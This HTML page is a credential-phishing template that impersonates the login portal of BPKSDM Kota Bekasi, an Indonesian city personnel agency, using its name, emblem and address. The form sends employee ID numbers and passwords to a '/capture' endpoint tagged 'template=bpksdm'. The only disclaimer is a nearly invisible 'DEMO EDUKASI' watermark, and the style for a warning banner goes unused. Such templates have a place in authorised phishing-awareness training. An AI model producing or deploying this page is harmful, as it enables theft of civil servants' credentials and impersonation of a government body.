<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BPKSDM Kota Bekasi — Portal Kepegawaian</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#0c4a6e,#1e3a5f);min-height:100vh;display:flex;flex-direction:column;align-items:center}
.demo-banner{background:#dc2626;color:#fff;text-align:center;padding:10px;font-size:13px;font-weight:bold;width:100%}
.card{background:#fff;border-radius:8px;box-shadow:0 4px 20px rgba(0,0,0,0.2);width:420px;margin-top:50px;overflow:hidden}
.header{background:#0c4a6e;color:#fff;padding:28px;text-align:center}
.header .emblem{width:64px;height:64px;margin-bottom:10px}
.header h1{font-size:15px;margin-bottom:2px;font-weight:600}
.header h2{font-size:12px;opacity:0.8;font-weight:normal}
.header h3{font-size:11px;opacity:0.6;margin-top:10px;font-weight:normal;letter-spacing:1px}
.body{padding:30px}
.form-group{margin-bottom:20px}
.form-group label{display:block;margin-bottom:6px;font-size:13px;color:#333;font-weight:600}
.form-group input{width:100%;padding:12px;border:1px solid #d1d5db;border-radius:4px;font-size:14px;transition:all 0.2s}
.form-group input:focus{outline:none;border-color:#0c4a6e;box-shadow:0 0 0 2px rgba(12,74,110,0.2)}
.checkbox{display:flex;align-items:center;gap:8px;margin-bottom:20px;font-size:13px;color:#555}
.btn{width:100%;padding:13px;background:#0c4a6e;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:bold;cursor:pointer;transition:background 0.2s}
.btn:hover{background:#0e3a56}
.footer{text-align:center;padding:15px;font-size:11px;color:#9ca3af;border-top:1px solid #e5e7eb;line-height:1.6}
</style>
</head>
<body>
<div class="card">
<div class="header">
<svg class="emblem" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M50 5L10 25V45C10 70 27 92 50 95C73 92 90 70 90 45V25L50 5Z" fill="#f59e0b"/>
<text x="50" y="58" text-anchor="middle" fill="#0c4a6e" font-size="26" font-weight="bold">BPK</text>
</svg>
<h1>BADAN KEPEGAWAIAN DAN PENGEMBANGAN</h1>
<h1>SUMBER DAYA MANUSIA</h1>
<h2>KOTA BEKASI</h2>
<h3>PORTAL LAYANAN KEPEGAWAIAN</h3>
</div>
<div class="body">
<form action="/capture" method="POST">
<input type="hidden" name="template" value="bpksdm">
<div class="form-group">
<label for="username">NIP / Username</label>
<input type="text" id="username" name="username" placeholder="Masukkan NIP atau username" required>
</div>
<div class="form-group">
<label for="password">Password</label>
<input type="password" id="password" name="password" placeholder="Masukkan password" required>
</div>
<div class="checkbox">
<input type="checkbox" id="remember" checked>
<label for="remember">Ingat Saya</label>
</div>
<button type="submit" class="btn">M A S U K</button>
</form>
</div>
<div class="footer">
&copy; 2026 BPKSDM Kota Bekasi v3.2 — SISTEM INFORMASI KEPEGAWAIAN TERINTEGRASI<br>
Jalan H. Moch. Jasin No. 1, Bekasi 17111
</div>
</div>
<div style="position:fixed;bottom:5px;right:10px;font-size:10px;color:rgba(220,38,38,0.3);font-weight:bold">&#x1F52C; DEMO EDUKASI</div>
</body>
</html>
